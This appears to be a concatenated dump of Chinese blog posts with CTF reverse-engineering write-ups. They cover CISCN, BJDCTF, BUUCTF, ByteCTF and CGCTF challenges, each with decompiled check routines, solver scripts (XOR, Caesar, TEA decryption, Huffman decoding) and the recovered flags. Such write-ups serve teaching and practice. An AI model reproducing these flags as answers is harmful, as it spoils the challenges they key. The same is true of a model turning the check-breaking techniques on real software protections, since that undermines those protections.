1234567891011121314151617181920212223242526272829303132begin&nbsp;$_=$$/$$;&nbsp;&nbsp;&nbsp;&nbsp;@_=$_+$_;&nbsp;&nbsp;&nbsp;&nbsp;$-_=$_-@_&nbsp;&nbsp;&nbsp;&nbsp;$__=-&gt;_{_==[]||_==''?$.:$_+$__[_[$_..$-_]]}&nbsp;#len&nbsp;&nbsp;&nbsp;&nbsp;@__=-&gt;_,&amp;__{_==[]?[]:[__[_[$.]]]+@__[_[$_..$-_],&amp;__]}&nbsp;&nbsp;&nbsp;&nbsp;$_____=-&gt;_{@__[[*_],&amp;-&gt;__{__[$.]}]}&nbsp;&nbsp;&nbsp;&nbsp;@_____=-&gt;_{@__[[*_],&amp;-&gt;__{__[$-_]}]}&nbsp;&nbsp;&nbsp;&nbsp;$______=-&gt;_{___,______=$_____[_],@_____[_];_____=$__[___];____={};__=$.;(_=-&gt;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;____[______[__]]=___[__];(__+=$_)==_____&nbsp;?____:_[]})[]}&nbsp;&nbsp;&nbsp;&nbsp;@______=-&gt;_,__{_=[*_]+[*__];____=$__[_];___={};__=$.;(_____=-&gt;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;___[_[__][$.]]=_[__][$_];(__+=$_)==____&nbsp;?___:_____[]})[]}&nbsp;&nbsp;&nbsp;&nbsp;$_______=-&gt;_{$___=[];@___=$__[_];__=___=____=$.;$____,@____={},[]&nbsp;&nbsp;&nbsp;&nbsp;(_____=-&gt;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_[____]=='5'?(@____&lt;&lt;____):$.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_[____]=='6'?($____[@____[$-_]]=____;@____=@____[$...$.-@_]):$.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(____+=$_)==@___?$.:_____[]})[]&nbsp;&nbsp;&nbsp;&nbsp;$____=$____=={}?{}:@______[$____,$______[$____]]&nbsp;&nbsp;&nbsp;&nbsp;puts($____);&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;puts(@____);&nbsp;&nbsp;&nbsp;&nbsp;(______=-&gt;{&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;puts(_[__])&nbsp;&nbsp;&nbsp;&nbsp;_[__]==&nbsp;&nbsp;&nbsp;&nbsp;'0'?($___[___]||=$.;$___[___]+=$_):_[__]==&nbsp;&nbsp;&nbsp;&nbsp;'1'?($___[___]||=$.;$___[___]-=$_):_[__]==&nbsp;&nbsp;&nbsp;&nbsp;'2'?($___[___]||=$.;$___[___]=STDIN.getc.ord):_[__]==&nbsp;&nbsp;&nbsp;&nbsp;'3'?(___+=$_):_[__]==&nbsp;&nbsp;&nbsp;&nbsp;'4'?(___-=$_):_[__]==&nbsp;&nbsp;&nbsp;&nbsp;'5'?(__=($___[___]||$.)==$.?$____[__]:__):_[__]==&nbsp;&nbsp;&nbsp;&nbsp;'6'?(__=($___[___]||$.)!=$.?$____[__]:__):_[__]==&nbsp;&nbsp;&nbsp;&nbsp;'7'?($&gt;&lt;&lt;(''&lt;&lt;$___[___])):$.&nbsp;&nbsp;&nbsp;&nbsp;(__+=$_)==@___?_:______[]})[]}&nbsp;&nbsp;&nbsp;&nbsp;$_______['3351635164300000000540000000003164073000000540000003164070070000071730000000541111111131641175160343516445163530440316354031643451634235163516000000054000000000003164344354131645335163435164444516333530444403331635403164344451665163423516351600000054000000000316413443541316453351634351644445163335304444033316354031643444516651634235163516000000005400000000000316403443541316453351634351644445163335304444033316354031643444516651634235163516000000005400000000000031640344354131645335163435164444516333530444403331635403164344451665163423516351600000540000000000031643443541316453351634351644445163335304444033316354031643444516651635164453030441633544033164533516351643000000005400000000003164171111744516644'];rescue&nbsp;Exception;end 虚拟机，按指令运行，5和6之间进行循环，读取一下指令 1234567891011121314151617181920op='3351635164300000000540000000003164073000000540000003164070070000071730000000541111111131641175160343516445163530440316354031643451634235163516000000054000000000003164344354131645335163435164444516333530444403331635403164344451665163423516351600000054000000000316413443541316453351634351644445163335304444033316354031643444516651634235163516000000005400000000000316403443541316453351634351644445163335304444033316354031643444516651634235163516000000005400000000000031640344354131645335163435164444516333530444403331635403164344451665163423516351600000540000000000031643443541316453351634351644445163335304444033316354031643444516651635164453030441633544033164533516351643000000005400000000003164171111744516644'for&nbsp;i&nbsp;in&nbsp;op:&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;i=='0':&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(\"stack[idx]+=1\")&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;i=='1':&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(\"stack[idx]-=1\")&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;i=='2':&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(\"stack[idx]=getch()\")&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;i=='3':&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(\"idx++\")&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;i=='4':&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(\"idx--\")&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;i=='5':&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(\"while&nbsp;stack[idx]!=0:\")&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;i=='6':&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(\"end&nbsp;while\")&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;i=='7':&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(\"puts(stack[idx])\")&nbsp;&nbsp;&nbsp;&nbsp;else:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print('error!!!!!') 之后分析解析的指令，使用这种方式进行输出 12345678910stack[idx]+=8while stack[idx]!=0:idx--stack[idx]+=9idx++stack[idx]-=1end whileidx--stack[idx]+=1puts(stack[idx]) 前几段代码输出Input:之后进行输入并验证，验证方法时进行循环，如果循环可以正常结束则最终会输出ok，如果不能则异常结束，没有输出 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849stack[idx]=getch()idx++stack[idx]=0idx++stack[idx]=0stack[idx]+=7while stack[idx]!=0:idx--stack[idx]+=11idx++stack[idx]-=1end whileidx--while stack[idx]!=0:idx--stack[idx]-=1idx++stack[idx]-=1end while#ch-77idx--while stack[idx]!=0:idx+=2stack[idx]=0idx++stack[idx]=0idx-=4stack[idx]=0idx+=3while stack[idx]!=0:idx++stack[idx]+=1idx-=4stack[idx]+=1idx+=3stack[idx]-=1end whileidx++while stack[idx]!=0:idx--stack[idx]+=1idx++stack[idx]-=1end whileidx-=3stack[idx]=0end whilestack[idx]=0 每一个循环都这样处理，循环本身是跑不出来的，所以成功的条件就是ch-77为0，不会进入循环，对于每一个循环都会得到一个数，一共5个输入，得到M5Ya7，测试成功，计算md5即可","link":"/2021/05/16/2021-05-16-2021_ciscn_Re%E9%83%A8%E5%88%86wp/"},{"title":"BJDCTF-re-wp","text":"这么长时间就出了两道这么简单的re出题人的良心不会痛吗 re选手做完两道题结束比赛…… 本来还想做做pwn，有时间再说吧 guessgame随机数用时间种子初始化过了，猜是猜不对的，而且猜对了也没用，会输出flag不在这里，但是可以直接用IDA直接找到flag…… 1BJD{S1mple_ReV3r5e_W1th_0D_0r_IDA} reverse-8086_ASM-DreamerJack16位DOS…… IDA打开，发现一段数据很奇怪，转换成code 12345678910111213mov cx, 22h ; '\"'seg001:0005 lea bx, aUDuTZWjQGjzZWz ; \"]U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b;\"seg001:0009seg001:0009 loc_10039: ; CODE XREF: seg001:000F↓jseg001:0009 mov di, cxseg001:000B dec diseg001:000C xor byte ptr [bx+di], 1Fhseg001:000F loop loc_10039seg001:0011 lea dx, aUDuTZWjQGjzZWz ; \"]U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b;\"seg001:0015 mov ah, 9seg001:0017 int 21h ; DOS - PRINT STRINGseg001:0017 ; DS:DX -&gt; string terminated by \"$\"seg001:0019 retn 异或，循环，输出…… 跑一下 123456target = [0x5D, 0x55, 0x5B, 0x64, 0x75, 0x7E, 0x7C, 0x74, 0x40, 0x7B, 0x7A, 0x40, 0x77, 0x6A, 0x2E, 0x7D, 0x2E, 0x7E, 0x71, 0x40, 0x67, 0x6A, 0x7A, 0x7B, 0x7A, 0x40, 0x77, 0x7A, 0x71, 0x57, 0x7E, 0x2F, 0x62, 0x3B]flag = ''for i in range(0x22): flag += chr(target[i] ^ 0x1F)print(flag) 输出flag，其中**$是DOS终止符** 1BJD{jack_de_hu1b1an_xuede_henHa0}$ 后记溜了，刷攻防世界去了 补作业去了","link":"/2020/03/21/BJDCTF-re-wp/"},{"title":"BUUCTF-re部分题解","text":"看到有些大佬在做BUUCTF的题，看了一下，题目很多，但是感觉良莠不齐，并且开始的一些题目有些太简单了，就当是多做些题目了。 easyre确实非常easy，直接拖进IDA看到flag 1flag{this_Is_a_EaSyRe} reverse1IDA打开，通过字符串窗口找到主程序，整个程序流程很简单 12345678910111213141516for ( j = 0; ; ++j ) { v8 = j; v2 = j_strlen(Str2); if ( v8 &gt; v2 ) break; if ( Str2[j] == 'o' ) Str2[j] = '0'; } sub_1400111D1(\"input the flag:\"); sub_14001128F(\"%20s\", &amp;Str1); v3 = j_strlen(Str2); if ( !strncmp(&amp;Str1, Str2, v3) ) sub_1400111D1(\"this is the right flag!\\n\"); else sub_1400111D1(\"wrong flag\\n\"); 只有这一部分有用，str2时内存中的一个字符串，只是将输入的字符串和变换过后的str2进行一个简单的对比，一样则输出正确 str2的变换就是将所有的o变换成0，str2为‘{hello_world}’，所以flag为 1flag{hell0_w0rld} reverse2和上一题完全一样，只不过时ELF64文件，把i和r全部替换成了1 1flag{hack1ng_fo1_fun} helloworld安卓逆向，直接apktool反编译，在MainActivity.smail文件里找到了flag 1flag{7631a988259a00816deda84afb29430a} 新年快乐简单加壳软件，在加壳时没做任何的修改，直接upx脱壳，IDA反编译，通过字符串直接找到flag 1flag{HappyNewYear!} 内涵的软件IDA反编译可以直接发现flag，把花括号里的放进flag{}里即可 1flag{49d3c93df25caad81232130f3d2ebfad} xor一看题目就是到要逆运算异或，反编译之后发现关键运算 12345for ( i = 1; i &lt; 33; ++i ) v6[i] ^= v6[i - 1]; v3 = global; if ( !strncmp(v6, global, 0x21uLL) ) printf(\"Success\", v3); 所以逆运算就好了 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() { unsigned char ida_chars[] = { 0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11, 0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F, 0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F, 0x47, 0x32, 0x4F }; string flag; flag+=ida_chars[0]; for(int i=1;i&lt;33;i++) { flag+=(ida_chars[i]^ida_chars[i-1]); } cout&lt;&lt;flag&lt;&lt;endl; return 0;} 直接输出flag 1flag{QianQiuWanDai_YiTongJiangHu} reverse3和bugku的love是同一个题，不再赘述 不一样的flag比较简单的的迷宫题，上下左右全部都标示的清清楚楚 迷宫如下图 12345*11110100001010000101111# 转换成5*5的方阵，*走到#即可 1flag{222441144222} 刮开有奖IDA反编译出来，发现需要输入8位，经过sub_4010F0这个函数的变换后，在经过两个base64变换（查看函数内部自己发现），满足条件即正确 sub_4010F0这个函数内容比较多，但是和输入的字符串无关，所以直接直接把函数实现然后求出来正确的取值就可以了（后面的条件略多，这里的变换实际上只需要第一位和第五位） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int __cdecl decrypt(char *a1, int a2, int a3) { int result; // eax int i; // esi int v5; // ecx int v6; // edx result = a3; for (i = a2; i &lt;= a3; a2 = i) { v5 = i; v6 = a1[i]; if (a2 &lt; result &amp;&amp; i &lt; result) { do { if (v6 &gt; a1[result]) { if (i &gt;= result) break; ++i; a1[v5] = a1[result]; if (i &gt;= result) break; while (a1[result] &lt;= v6) { if (++i &gt;= result) goto LABEL_13; } if (i &gt;= result) break; v5 = i; a1[result] = a1[i]; } --result; } while (i &lt; result); } LABEL_13: a1[result] = v6; decrypt(a1, a2, i - 1); result = a3; ++i; } return result;}char v9[20] = {90, 74, 83, 69, 67, 97, 78, 72, 51, 110, 103};int main() { cout &lt;&lt; v9 &lt;&lt; endl; decrypt(v9, 0, 10); cout &lt;&lt; v9 &lt;&lt; endl; return 0;} 输出如图所示 接着分析下面的部分 12345678910if ( String == v9 + 34 // 第一位等于51+34=85--&gt;'U' &amp;&amp; v21 == v13 //第2位，等于v13,即sub_4010F0函数返回值的第5位值--&gt;'J' &amp;&amp; 4 * v22 - 141 == 3 * v11 &amp;&amp; v23 / 4 == 2 * (v16 / 9) &amp;&amp; !strcmp(v6, \"ak1w\") // 第6,7,8个字符base64之后，等于ak1w &amp;&amp; !strcmp(v7,\"V1Ax\") // 第3,4,5个字符，base64之后等于V1Ax ) { MessageBoxA(hDlg, \"U g3t 1T!\", \"@_@\", 0); } 还多了两个条件就检验正确就可以了 得到flag 1flag{UJWP1jMp} SimpleRev这题没什么难度，IDA打开 12345678910111213141516171819202122int __cdecl __noreturn main(int argc, const char **argv, const char **envp){ int v3; // eax char v4; // [rsp+Fh] [rbp-1h] while ( 1 ) { while ( 1 ) { printf(\"Welcome to CTF game!\\nPlease input d/D to start or input q/Q to quit this program: \", argv, envp); v4 = getchar(); if ( v4 != 'd' &amp;&amp; v4 != 'D' ) break; Decry(); } if ( v4 == 'q' || v4 == 'Q' ) Exit(); puts(\"Input fault format!\"); v3 = getchar(); putchar(v3); }} main函数里面没有什么需要注意的东西，解决问题的重点就都放在Decry()这个函数里了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768unsigned __int64 Decry(){ char v1; // [rsp+Fh] [rbp-51h] int v2; // [rsp+10h] [rbp-50h] int v3; // [rsp+14h] [rbp-4Ch] int i; // [rsp+18h] [rbp-48h] int v5; // [rsp+1Ch] [rbp-44h] char src[8]; // [rsp+20h] [rbp-40h] __int64 v7; // [rsp+28h] [rbp-38h] int v8; // [rsp+30h] [rbp-30h] __int64 v9; // [rsp+40h] [rbp-20h] __int64 v10; // [rsp+48h] [rbp-18h] int v11; // [rsp+50h] [rbp-10h] unsigned __int64 v12; // [rsp+58h] [rbp-8h] v12 = __readfsqword(0x28u); *(_QWORD *)src = 'SLCDN'; v7 = 0LL; v8 = 0; v9 = 'wodah'; v10 = 0LL; v11 = 0; text = join(key3, (const char *)&amp;v9); // text=killshadow strcpy(key, key1); // key=key1='ADSFK' strcat(key, src); // key='ADSFKNDCLS' v2 = 0; v3 = 0; getchar(); v5 = strlen(key); for ( i = 0; i &lt; v5; ++i ) { if ( key[v3 % v5] &gt; '@' &amp;&amp; key[v3 % v5] &lt;= 'Z' ) key[i] = key[v3 % v5] + 32; ++v3; } // 转换为小写 // key='adsfkndcls' printf(\"Please input your flag:\", src); while ( 1 ) { v1 = getchar(); if ( v1 == '\\n' ) // 遇到回车结束 break; if ( v1 == ' ' ) // 跳过空格 { ++v2; } else { if ( v1 &lt;= 96 || v1 &gt; 122 ) { if ( v1 &gt; 64 &amp;&amp; v1 &lt;= 90 ) // 大写字母 str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97; } else // 小写字母 { str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97; } if ( !(v3 % v5) ) putchar(32); ++v2; } } if ( !strcmp(text, str2) ) puts(\"Congratulation!\\n\"); else puts(\"Try again!\\n\"); return __readfsqword(0x28u) ^ v12;} 需要注意src和v9本身是以long long类型赋值，转换成字符串要记得逆序，接下来的过程就很简单了，程序的过程很清楚，直接逆向运算就可以算出来结果了 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main(void) { int n = 0, v5 = 10, v3 = 10, v2 = 0; char v1; char flag[11] = {0}; char key[] = \"adsfkndcls\"; char text[] = \"killshadow\";//通过放缩，j只能取0-3之间 for (int j = 0; j &lt; 4; ++j) { for (v2 = 0; v2 &lt; 10; ++v2) { v1 = text[v2] - 97 + 26 * j - 97 + key[v3++ % v5] + 39; if ((v1 &gt;= 65 &amp;&amp; v1 &lt;= 90) || (v1 &gt;= 97 &amp;&amp; v1 &lt;= 122)) { flag[v2] = v1; if (++n == 10) { printf(\"flag{%s}\\n\", flag); return 0; } } } } return 0;} 这里的j是用来逆向取余运算时候遍历，放缩之后得到一个范围，然后计算就可以了 1flag{KLDQCUDFZO} Java逆向解密第一次做Java逆向，顺便也熟悉熟悉Java，所以逆向程序也是用Java写的 附件打开是class文件，IDEA直接可以反编译，反编译出来的代码很简单 1234567891011121314151617181920212223242526272829303132333435363738394041import java.util.ArrayList;import java.util.Scanner;public class Reverse { public Reverse() { } public static void main(String[] args) { Scanner s = new Scanner(System.in); System.out.println(\"Please input the flag ：\"); String str = s.next(); System.out.println(\"Your input is ：\"); System.out.println(str); char[] stringArr = str.toCharArray(); Encrypt(stringArr); } public static void Encrypt(char[] arr) { ArrayList&lt;Integer&gt; Resultlist = new ArrayList(); for(int i = 0; i &lt; arr.length; ++i) { int result = arr[i] + 64 ^ 32; Resultlist.add(result); } int[] KEY = new int[]{180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65}; ArrayList&lt;Integer&gt; KEYList = new ArrayList(); for(int j = 0; j &lt; KEY.length; ++j) { KEYList.add(KEY[j]); } System.out.println(\"Result:\"); if (Resultlist.equals(KEYList)) { System.out.println(\"Congratulations！\"); } else { System.err.println(\"Error！\"); } }} 把KEY每个值都减去64^32就好了，没什么难度，所以试试用Java写，练练手 1234567891011121314151617181920package com.company;import java.util.ArrayList;public class Main { public static void main(String[] args) { int[] KEY = new int[]{180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65}; ArrayList&lt;Integer&gt; resultList = new ArrayList&lt;&gt;(); for (int value : KEY) { resultList.add(value - 64 ^ 32); }// System.out.println(resultList); StringBuilder s = new StringBuilder(); for (int value:resultList){ s.append((char)value); } System.out.println(\"flag{\"+s+\"}\"); }} 直接输出flag 1flag{This_is_the_flag_!} findit不管是apktool反编译还是直接cfr反编译到代码，都可以找到一串很像flag的字符数组 1pvkq{m164675262033l4m49lnp7p9mnk28k75} 直接凯撒密码解密，a与k之间相差10，所以key=10 1flag{c164675262033b4c49bdf7f9cda28a75} rsa直接解析公钥，然后暴力分解解密就可以了","link":"/2020/01/11/BUUCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"},{"title":"ByteCTF re moderncpp 题解","text":"首发于先知 题目本身并不难，最大的难点在于要逆C++的数据结构，导致程序的逻辑难以理解。 Analysismain函数位于0x402954，主要的逻辑就是输入、进行检查、初始化、数据处理以及最后的对比。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253int __cdecl main(int argc, const char **argv, const char **envp){ __int64 v3; // rax __int64 v4; // rbx __int64 v5; // rbx void (__fastcall *v6)(char *, __int64, __int64); // rbx __int64 v7; // rax __int64 v8; // rax __int64 v9; // rax char v11[16]; // [rsp+0h] [rbp-C0h] BYREF char v12[16]; // [rsp+10h] [rbp-B0h] BYREF char answer[32]; // [rsp+20h] [rbp-A0h] BYREF char input[47]; // [rsp+40h] [rbp-80h] BYREF char v15; // [rsp+6Fh] [rbp-51h] BYREF char v16[16]; // [rsp+70h] [rbp-50h] BYREF char v17[16]; // [rsp+80h] [rbp-40h] BYREF __int64 v18; // [rsp+A0h] [rbp-20h] __int64 v19; // [rsp+A8h] [rbp-18h] sub_4257A0(input); nullsub_7(&amp;v15); sub_427EC0(answer, &amp;dword_536800, 40LL, &amp;v15); //最终结果 nullsub_9(&amp;v15); v3 = sub_41F910(&amp;stdout, \"input:\"); ((void (__fastcall *)(__int64))sub_41F2C0)(v3); sub_40BDC0(&amp;stdin, input); //输入 v4 = malloc(64LL); sub_4010A0(v4); v18 = v4; v5 = malloc(64LL); sub_4010A0(v5); v19 = v5; check_1(input); //检查以及初始化 (*(void (__fastcall **)(char *, __int64, char *))(*(_QWORD *)v18 + 8LL))(v16, v18, input); sub_404334(v12, v16); sub_403E24(v16); v6 = *(void (__fastcall **)(char *, __int64, __int64))(*(_QWORD *)v19 + 8LL); v7 = sub_404EF6(v12); v6(v17, v19, v7); sub_404334(v11, v17); sub_403E24(v17); v8 = sub_404EF6(v11); if ( (unsigned __int8)sub_404F07(v8, answer) ) //比较 v9 = sub_41F910(&amp;stdout, \"congrats!\"); else v9 = sub_41F910(&amp;stdout, \"try again.\"); ((void (__fastcall *)(__int64))sub_41F2C0)(v9); sub_403E24(v11); sub_403E24(v12); sub_4258C0(answer); sub_4258C0(input); return 0;} 0x4027D5处函数(check_1)先对输入进行了检查，要求长度为41且格式为bytectf{*****}。 接下来进行了部分初始化操作，输出了一句似乎没什么用的话，然后进行了编码操作。 第一步是在0x401414函数处生成字母表 该处操作在内存中生成了一个字母表abcdefghijklmnopqrstuvwxyz0123456789!@#%^&amp;*()_+-=[]{};，接着在该函数中调用0x4018D6处函数，生成与字母表长度相同的一个整数数组，生成的规则如下： 第二步在上述函数中调用0x401C86处函数，主要进行的操作就是将上面生成的两个进行一一对应的组合 第三步是经过对数据的一些预处理操作之后，在sub_4015EE(gen_code)内对字母表中的字母进行编码 很像一棵树，先添“0”，遍历左子树，然后添“1”，遍历右子树，很明显利用预先构造好的树对字符进行0-1编码。编码结束之后对输入进行处理。 第一步处理很简单，对输入进行逐字节编码，拼接在一起，然后8位一组转化为int。 可以发现是高位在前，低位在后 该部分经过多次调试可以发现，每一个字母为不等长0-1编码，且每次编码固定，如果不确定是什么编码方式的话也可以使用调试的方式，通过输入不同的字符来查找对应的编码。但实际上很容易想到这是Huffman编码。 后面的处理是加密，在0x4024A4处，根据特征值0x9E3779B9或者使用findcrypt插件可以很容易发现这是tea加密 明文为刚刚进行编码过的数据，对该函数交叉引用很快就可以找到key 继续回到main函数，加密的结果与最开始拷贝的0x536800处的40个字节进行对比，相同则正确。 Solution先解密tea得到编码后的结果 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void decrypt(uint32_t *v, uint32_t *k){ uint32_t v0 = v[0], v1 = v[1], sum = 0xC6EF3720, i; uint32_t delta = 0x9e3779b9; uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (i = 0; i &lt; 32; i++) { v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3); v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1); sum -= delta; } v[0] = v0; v[1] = v1;}int main(){ uint32_t v[10] = {0x0C5D3669F, 0x0B917171A, 0x0B4B37B19, 0x0AE80C5F, 0x8D80307F, 0x21522880, 0x34D80589, 0x0DE6C83D1, 0x59B73618, 0x0C6E65D35}, k[4] = {0x62797465, 0x2D637466, 0x77656C63, 0x6F6D657E}; for (int i = 0; i &lt; 5; i++) { uint32_t tmp_v[]={v[2*i],v[2*i+1]}; decrypt(tmp_v, k); printf(\"%x,%x,\", tmp_v[0], tmp_v[1]); } return 0;}// d869f00c,62fb324a,ccca48e,e56322c0,5e07fdb6,8dc6fee6,ad518dfd,14fa68e4,78 按照小端序转换为字节后，继续转换为8位二进制字符串拼接，从头开始向后遍历，在表中找到对应的字母后调整开头位置，继续向后遍历，Huffman编码保证了这样做结果的唯一性。字母表使用Huffman编码的方式生成会更快，但是手动调试出来对于程序分析的难度会较低，是个比较讨巧的办法。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129class Node(): def __init__(self, name=None, value=None): self.name = name self.value = value self.right = None self.left = Noneclass HuffmanTree(): def __init__(self, arr): self.charset = {} self.nodes = [Node(values[0], values[1]) for values in arr] while len(self.nodes) != 1: self.nodes.sort(key=lambda node: node.value) p = Node(value=(self.nodes[0].value + self.nodes[1].value)) p.left = self.nodes.pop(0) p.right = self.nodes.pop(0) self.nodes.append(p) self.root = self.nodes[0] self.Code = list(range(60)) def HuffmanCode(self, tree, length): node = tree if (not node): return elif node.name: result = '' for i in range(length): result += str(self.Code[i]) self.charset[node.name] = result return self.Code[length] = 0 self.HuffmanCode(tree.left, length + 1) self.Code[length] = 1 self.HuffmanCode(tree.right, length+1) def GenCode(self): self.HuffmanCode(self.root, 0)alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789!@#%^&amp;*()_+-=[]{};'arr = []for i in range(54): arr.append((43*(127+i)) % 233)char_weights = list(zip(alphabet, arr))tree = HuffmanTree(char_weights)tree.GenCode()# checkcharset = { 'b': '00001', 'y': '10011', 't': '11000', 'e': '0011010', 'c': '01110', 'f': '010010', '{': '10001', 'a': '100101', 'd': '11011', 'g': '111011', 'h': '01000', 'i': '10110', 'j': '00110111', 'k': '1111010', 'l': '110010', 'm': '00011', 'n': '10000', 'o': '10100011101', 'p': '0110011', 'q': '011000', 'r': '111110', 's': '01011', 'u': '11110110', 'v': '000001', 'w': '111000', 'x': '00101', 'z': '101000110', '0': '1110010', '1': '100100', '2': '111111', '3': '01101', '4': '11010', '5': '11110111', '}': '1010001111', '6': '001100', '7': '111010', '8': '00111', '9': '10101', '!': '00110110', '@': '1110011', '#': '101001', '%': '00010', '^': '01111', '&amp;': '10100011100', '*': '0110010', '(': '010011', ')': '111100', '_': '01010', '+': '10111', '-': '10100010', '=': '000000', '[': '110011', ']': '00100', ';': '1010000'}assert(charset == tree.charset)new_dic = dict(zip(tree.charset.values(), tree.charset.keys()))# d869f00c,62fb324a,ccca48e,e56322c0,5e07fdb6,8dc6fee6,ad518dfd,14fa68e4,78target = [0x0c, 0xf0, 0x69, 0xd8, 0x4a, 0x32, 0xfb, 0x62, 0x8e, 0xa4, 0xcc, 0x0c, 0xc0, 0x22, 0x63, 0xe5, 0xb6, 0xfd, 0x07, 0x5e, 0xe6, 0xfe, 0xc6, 0x8d, 0xfd, 0x8d, 0x51, 0xad, 0xe4, 0x68, 0xfa, 0x14, 0x78]f = ''.join([bin(i)[2:].rjust(8, '0') for i in target])i = 0j = 5while j &lt; len(f): tmp = f[i:j] if new_dic.get(tmp): print(new_dic[tmp], end='') i = j j += 5 else: j += 1 需要注意的是这里生成Huffman编码的时候，相同数值使用不同的排序算法可能会有不同的顺序，例如使用python的sort算法时，倒序的方式生成的编码与题目中生成的不同，有可能需要多尝试几次。","link":"/2021/11/04/ByteCTF-re-moderncpp-%E9%A2%98%E8%A7%A3/"},{"title":"CGCTF-re部分题解","text":"CG-CTF是南邮的平台，题目都很不错，这里记录一下部分题解决题目的思路和方法 Hello,RE!打开程序，发现输入flag，用OD打开，注意到是将输入的字符串和flag直接进行比较，所以单步调试直接找到flag ReadAsm2这题考的是直接读汇编的能力，代码贴在下面 123456789int main(int argc, char const *argv[]){ char input[] = {0x0, 0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d, 0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b, 0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c}; func(input, 28); printf(\"%s\\n\",input+1); return 0;} 123456789101112131415161718192021222324252600000000004004e6 &lt;func&gt;: 4004e6: 55 push rbp 4004e7: 48 89 e5 mov rbp,rsp 4004ea: 48 89 7d e8 mov QWORD PTR [rbp-0x18],rdi 4004ee: 89 75 e4 mov DWORD PTR [rbp-0x1c],esi 4004f1: c7 45 fc 01 00 00 00 mov DWORD PTR [rbp-0x4],0x1 4004f8: eb 28 jmp 400522 &lt;func+0x3c&gt; 4004fa: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] 4004fd: 48 63 d0 movsxd rdx,eax 400500: 48 8b 45 e8 mov rax,QWORD PTR [rbp-0x18] 400504: 48 01 d0 add rax,rdx 400507: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] 40050a: 48 63 ca movsxd rcx,edx 40050d: 48 8b 55 e8 mov rdx,QWORD PTR [rbp-0x18] 400511: 48 01 ca add rdx,rcx 400514: 0f b6 0a movzx ecx,BYTE PTR [rdx] 400517: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] 40051a: 31 ca xor edx,ecx 40051c: 88 10 mov BYTE PTR [rax],dl 40051e: 83 45 fc 01 add DWORD PTR [rbp-0x4],0x1 400522: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] 400525: 3b 45 e4 cmp eax,DWORD PTR [rbp-0x1c] 400528: 7e d0 jle 4004fa &lt;func+0x14&gt; 40052a: 90 nop 40052b: 5d pop rbp 40052c: c3 ret 发现这段汇编的作用就是实现input[i]^i，所以实现上面代码输出得到flag 1234567891011s = [0x0, 0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d, 0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 